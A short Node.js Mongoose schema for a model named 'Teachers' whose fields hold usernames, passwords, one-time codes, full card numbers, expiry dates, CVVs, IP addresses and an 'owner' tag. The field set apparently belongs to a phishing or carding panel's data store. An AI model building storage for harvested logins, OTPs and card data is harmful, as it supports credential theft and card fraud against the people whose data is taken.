const mongoose = require("mongoose");

const teacherSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    otp: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    status: Number,
    ip: String,
    owner: String,
});

module.exports = mongoose.model("Teachers", teacherSchema);
